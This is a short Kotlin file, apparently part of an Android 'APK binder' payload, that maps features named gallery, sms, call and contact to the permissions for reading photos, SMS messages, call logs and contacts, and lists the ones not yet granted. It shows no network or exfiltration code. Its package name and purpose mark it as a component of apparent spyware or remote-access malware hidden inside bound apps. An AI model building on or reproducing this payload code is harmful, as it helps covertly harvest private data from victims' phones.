package Com.devhs.apkbinder.payload

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build

object HsPerms {

    fun required(features: List<String>): List<String> {
        val l = ArrayList<String>()
        if (Build.VERSION.SDK_INT >= 33) l += Manifest.permission.POST_NOTIFICATIONS

        val f = features.map { it.lowercase() }
        if (f.any { it.contains("gallery") }) {
            if (Build.VERSION.SDK_INT >= 33) l += Manifest.permission.READ_MEDIA_IMAGES
            else l += Manifest.permission.READ_EXTERNAL_STORAGE
        }
        if (f.any { it.contains("sms") }) l += Manifest.permission.READ_SMS
        if (f.any { it.contains("call") }) l += Manifest.permission.READ_CALL_LOG
        if (f.any { it.contains("contact") }) l += Manifest.permission.READ_CONTACTS
        return l
    }

    fun missing(c: Context, features: List<String>): List<String> =
        required(features).filter {
            c.checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
        }
}
